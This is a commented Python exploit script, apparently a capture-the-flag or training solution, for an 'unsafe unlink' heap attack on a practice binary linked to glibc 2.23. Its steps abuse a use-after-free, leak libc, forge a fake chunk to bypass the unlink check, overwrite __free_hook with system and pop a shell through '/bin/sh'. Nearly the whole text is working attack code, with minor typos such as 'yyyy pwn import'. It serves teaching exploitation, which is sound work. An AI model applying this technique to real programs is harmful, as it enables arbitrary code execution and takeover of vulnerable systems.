'''
Unsafe unlink challenge solution :) 

Everything is explained pretty well below (broken down into 7 steps) 
with ASCII diagrams of the heap. 

Go through each step in pwndbg and understand what is going on. 


For more on this technique: 
- https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html
- https://dangokyo.me/2018/01/01/heap-exploitation-unsafe-unlink-fastbin-corruption/
'''

yyyy pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../libc_versions/2.23/libc-2.23.so' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.magic_value'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.23/
''') 
else: 
	p = process(elf.path, env=env) 

'''
Creates a string 

Parameter: 
	- string: the text to be put into the string.
'''
def create_string(size_type, string):
	p.sendlineafter(">", "1") 
	p.sendlineafter(">", str(size_type))
	p.sendlineafter(">", str(string))

'''
View A string

Parameter:
	- index: The index of the string to print
Returns: 
	- The output from the print
'''
def view_string(index): 
	p.sendlineafter(">", "4")
	p.sendlineafter(">", str(index))
	p.recvuntil("Your string:") # Right before string output

	# Outputted data
	output = p.recvuntil("Welcome").replace("Welcome","") 
	return output

'''
Delete a string 

Parameter: 
	- index: The index of the string to remove
'''	
def delete_string(index): 
	p.sendlineafter(">", "3")
	p.sendlineafter(">", str(index))
	return 

''' 
Edit a string
Parameters: 
	- index: The index of the string to edit
	- string: The text to be put into the string
'''
def edit_string(index, string):
	p.sendlineafter(">", "2") 
	p.sendlineafter(">", str(index))
	p.sendlineafter(">", str(string)) 
	return 

def trigger_bug():
	###########################
	# SETUP ###################
	###########################
	''' 
	Instead of setting the ptr to zero in the lst, it just 
	decrements the counter for the size. 

	So, if we free a 'string' that is not at the top of the list
	there is a 'use after free' that is created. 

	We allocate two 'strings' and free index 0. Now, there is a
	UAF on the 0th index. 
	
	The first size needs to be LARGE for an overwrite later. 
	'''
	create_string('l', "ONE")   # Index 0 
	create_string('l', "TWO")   # Index 1 
	create_string('l', "THREE") # Index 2
	create_string('l', "FOUR")  # Index 3

	##########################
	#### Trigger #############
	##########################
	# Free index 3 AND 0 -- This creates a use after free on the malloc chunk at index 1. 
	'''
	This chunks goes into the unsorted bin because of the size. 
	The chunk directly above (index 1) is important because if 
	this chunk was not there, then the chunk would be next to the 
	top chunk as free. 

	Unsorted bin chunks which are adjacent to the top chunk are 
	unlinked and added to the top chunk.
	''' 
	delete_string(0) 
	delete_string(1) 
	return 0 

def libc_leak(): 
	'''
	From the previous step, there is a UAF on an unsorted_bin chunk
	at index 0. 
	This allows us to get a LEAK to LibC (only item in the bin. So,
	both pointers point to LibC). 

	Use the offset to get the base of libc! 
	'''
	offset = 0x39fb78
	leak = view_string(0)[1:8] + "\x00"
	leak = u64(leak) # Unpack the string to convert it to an integer
	print("LibC Leak: ", hex(leak))
	
	libc_base = leak - offset
	print("LibC Base: ", hex(libc_base))
	libc.address = libc_base
	return libc_base

def overlap_chunks(): 
	'''
	Corrupt size of an unsorted_bin size chunk
	At this point, we have the following heap structure: 
	
	--- Index 0 AND Index 1 chunks(both 'l' and combined in unsorted_bin ---
	prev_size: 0x0 
	size: 0x161 (first chunk always has prev_inuse bit set
	fd: bin ptr 
	bk: bin ptr
	....
	--- Index 2 Chunk ('l') ----
	prev_size: 0x160
	size: 0xb0 (prev_inuse is NOT set) 
	....
	--- Index 3 Chunk ('l') ---- 
	prev_size: 0x0 
	size: 0xb1 (prev_inuse is SET) 
	...
	--- top chunk ---	


	However, with the bad handling of indexes, both index 2 and 3
	are not accessible. Indexes 0 and 1 of a use-after-free on them
	with index 0 pointing to the first chunk on the heap.

	In order to corrupt the metadata with this information, we 
	can OVERLAP some chunks! 

	Currently, index 0 is believed to have a chunk of size 0xb0 ('l'). 
	With a 0x160 chunk in the unsorted_bin, if we allocate a chunk
	of size 0x90 ('s' string) then this chunk will be SPLIT. This returns
	the bottom half as the chunk and the other half back into the 
	unsorted_bin. 

	Why is this awesome? Index 0 is overlapping with the newly 
	allocated chunk (index 2) with a LARGER size than the buffer. 
	Index 0 can write 0xa0 bytes, even though the size of the chunk 
	is only 0xa0 total (including metadata). This makes it possible 
	to overwrite the prev_size and size of the next chunk!

	At this point, several attacks could be used, including overwriting
	the chunk size to overlap chunks. For this though, we are going
	to use the 'unsafe unlink' technique though. This is about 
	forcing a bad consolidation to eventually overwrite pointers. 
	
	To setup the bad consolidation, we will need to allocate
	the chunk directly ahead of it (labeled index 3 below). 
	Once this is there, we will alter the metadata (size and 
	prev_size). 

	After we do this, the heap will look like the following: 

	--- Index 2 --- <--- UAF on index 0 here
	prev_size: 0x0 
	size: 0xa0 (first chunk always has prev_inuse bit set
	....
	--- Index 3 --- <-- UAF part way into chunk on index1
	prev_size: 0x0
	size: 0xb0 
	--- Index 2 old Chunk ('l') ---- (overwritten) 
	prev_size: 0x160
	size: 0xb0 (prev_inuse is NOT set) 
	....
	--- Index 3 old Chunk ('l') ---- (overwritten)
	prev_size: 0x0 
	size: 0xb1 (prev_inuse is SET) 
	...
	--- top chunk ---	
	
	At this point, we can write 0xa0 with index 0, which is enough to
	overwrite the size and prev_size of the second chunk (from above 
	at index 3). 
	'''
	create_string('s', 'FILLER') # Index 2 -- Overlaps with Index 0 

	create_string('l', 'Overwritten Victim') # Index 3 -- Victim to overwrite

def corrupt_metadata():	
	'''
	Recall the structure of the heap (for simplicitly, the last two 
	chunks were removed). In particular, index 0 can write 
	0xa0 bytes via a UAF on the first chunk, when the size is 
	only 0xa0 TOTAL: 

	--- Index 2 --- <--- UAF on index 0 here
	prev_size: 0x0 
	size: 0xa0 (first chunk always has prev_inuse bit set
	....
	--- Index 3 --- <-- UAF part way into chunk on index1
	prev_size: 0x0
	size: 0xb1

	We have a 0x10 byte buffer overflow on index 2's chunk via
	a UAF on index 0. To launch this consolidation attack, we 
	are going to set a few things: 
		- prev_inuse of size to 0. When the chunk at index 3
		  is freed, it will now try to consolidate with the 
		  first chunk. 
		- size: Keep the same besides the prev_inuse bit.
		  This is to ensure that the forward consolidation
		  checks don't crash the program. 
		- prev_size is set to 0xa0 - 0x10. (This explain further
		  down). 

	The main purpose behind the 'unsafe unlink' attack is to 
	bypass the security checks at https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1417. 
	All bypassing this check is very difficult, this attack aims to 
	do so by the ACTUAL pointer to the chunk itself (in the 'strings'
	variable). 

	To understand WHY the prev_size is edited to point to MINUS 
	0x10 from the chunk instead of on the chunk directly, please
	read the 'trigger_unlink' section. Once this is understood, 
	the reason for this is fairly clear (tldr; chunk vs. mem) 
		
	'''
	corrupted_chunk = "A" * 0x90 # Filler prior to chunk 
	corrupted_chunk += p64(0xa0 - 0x10)  # prev_size
	corrupted_chunk += p64(0xc0) # size. Remove the prev_inuse bit

	# Corrupt unsorted bin chunk (last remainder) 
	edit_string(0, corrupted_chunk) # Overlap 0 and 2. Overwrite chunk of index 3


def trigger_unlink():	
	'''
	At this point, the metadata of a chunk is corrupted, allowing
	for an improper consolidation. But, we need to bypass the security
	check below: 
	- P->fd->bk = P and P->bk->fd = P

	The storage location of the pointer (to a malloc string) is
	in the 'strings' section. This OF COURSE points to the malloc pointer!
	So, our goal is to point the 'fd' and 'bk' pointers to this 
	in order to bypass the security check. But how? 

	Here's a step by step (through the code): 
	FD = P->fd; <--- Set fd to point to 'strings' ptr - 0x18 (bk offset later)
	BK = P->bk; <--- Set bk to point to 'strings' ptr - 0x10 (bk offset later) 
	Recall that strings[0] == P (because that's where the 
	pointer is stored)

	In the security check: 
	- Does FD->bk (FD + 0x18) == P? fd + 0x18 does equal P!
	- Does BK->fd (BK + 0x18) == P? bk + 0x10 does equal P!
	Check bypassed! :) 

	Because strings[0] == P, by making the offsets proper, 
	we can bypass this security check on the unlink!

	So, what's up with the size being edited? 
	This is the difference between a 'chunk' and 'mem'. The check 
	for 'P' is checking for a chunk (including the metadata) where 
	the pointer in 'strings' is to a pointer to a 'mem' 
	(NOT including metadata). This creates a 0x10 difference between 
	chunk and mem. Because of this, the attack cannot be performed 
	by simply editing fd and bk pointers; it requires a chunk 
	prev_size to be overwritten  to point to 'mem' or to 'chunk - 0x10'
	. If this is confusing, then review the macros at 
	https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1218.
 
	What does the heap look like now: 

	--- Index 2 --- <--- UAF on index 0 here
	prev_size: 0x0 
	size: 0xa0 (first chunk always has prev_inuse bit set
	FAKE prev_size <---- Next chunk points here
	FAKE size 
	FAKE fd: points to strings[0] - 0x18 
	FAKE bk: points to stings[0] - 0x10
	....
	--- Index 3 --- <-- UAF part way into chunk on index1
	prev_size: 0x90 (0xa0 - 0x10)
	size: 0xb0 <--- prev_inuse NOT set!

	Now, we call free on the chunk at index 3 to trigger the consolidation!
	This consolidation triggers an 'unsafe unlink'!	


	What's the actual result? To the source code!
	Recall that FD = strings[0] - 0x18, 
		    BK = strings[0] - 0x10. 
	FD->bk (strings[0]) = BK; <-- gets overwritten by next step...
	BK->FD (strings[0]) = FD = strings[0] - 0x18

	WOW! This sets strings[0] (the pointer inside this) to 
	strings[0] - 0x18! This means we can overwrite the pointers 
	within the strings itself!! 
	This creates the ability to a WRITE WHAT WHERE primitive! 
	Although this is MUCh harder to setup than the old unlink,
	it is more persistent and DEADLY than the older one. 
	'''
	
	'''
	NOTE on SIZE: 
	
	In order to prevent the large_bin fd_nextsize and bk_nextsize 
	from being used, keep the chunk SMALLER than a large_bin chunk. 
	Or, do the SAME unlinking bypass (shown above) for the 
	large_bin fd_nextsize and bk_nextsize pointers. In this case, 
	we just set it to 0x0 to make our lives easier. 

	There's an additional security check added to unlink at
	https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L1405
	in version 2.26. If you want to bypass this, just add a 
	0x90 to the size field. This does not mitigate the vulnerability
	but does not it harder.
	
	'''
	fake_chunk = p64(0x0) * 2 # size and prev_size
	# Bypass FD->bk = P and BK->fd = P
	fake_chunk += p64(elf.symbols['strings'] - 0x18) # Fake fd
	fake_chunk += p64(elf.symbols['strings'] - 0x10) # Fake bk 

	# Create fake chunk to consolidate (could also edit with index 2)
	edit_string(0, fake_chunk) 

	# Free index 3 to trigger consolidation
	# Sets the unlinked chunk (index 0) to storage location - 0x20
	delete_string(3) 


def write_pointer(libc_base): 
	'''
	Index 0 now has a pointer to strings[0] - 0x18 from the previous
	step. Now, let's setup for something HUGE!
	Write here in order to get an arbitrary write! :) 

	The easiest thing to do (and LibC version agnostic) is
	to write to an active 'strings' variable the location of 
	__free_hook or some string handling function. The reason 
	that __free_hook is super nice is that RELRO does not affect
	it AND we can pass a string via the freed chunk later. 


	There is a small hiccup here... directly behind 'strings' is 
	the pointers to stdin and stdout in LIBC! So, we repair 
	stdout prior to overwritting the index 0 pointer. 
	'''
	
	stdout_offset = 0x39f8e0

	# The repairs does not work every time... need to find out why.
	payload = p64(0x0) # Repair part of STDIN
	payload += p64(libc_base + stdout_offset) + p64(0x0) # Pair STDOUT
	payload += p64(libc.symbols['__free_hook']) # Index 0 NOW points to _free_hook
	
	# Set _free_hook to strings[0] location
	edit_string(0, payload) 

def code_exec():
	'''
	Index 0 has a pointer to __free_hook 
	Write to this the address of system :) 

	To make life easier (instead of using a one_gadget) set
	the freed chunk to have '/bin/sh' in order to have a good parameter
	be passed to 'system'. 
	'''
	edit_string(0, p64(libc.symbols['system']))	
	
	create_string('s', '/bin/sh') # Use as the proper call to system. index 3
	delete_string(3) # Pop shell via 'system("/bin/sh"'
	

# Location of the magic value in memory

# Trigger the vulnerability. 
# Creates a UAF on index 0 and 1. 
UAF_index = trigger_bug()

# Get a LibC leak via UAF on index 0.
libc_base = libc_leak()

'''
Use UAF to overlap index 0 with index 2. 
Creates a 0x10 byte buffer overflow on the chunk 
directly above the first chunk. 
'''
overlap_chunks()

# Corrupt metadata of chunk to create a malicious consolidation later
corrupt_metadata()

''' 
Create the fake chunk and trigger the unlink.
Sets strings[0] pointer to point to strings[0] - 0x18
'''
trigger_unlink()

# Use overwrite to point strings[0] to __free_hook 
write_pointer(libc_base) 

# Pop a shell by setting __free_hook to system
code_exec()

p.interactive()


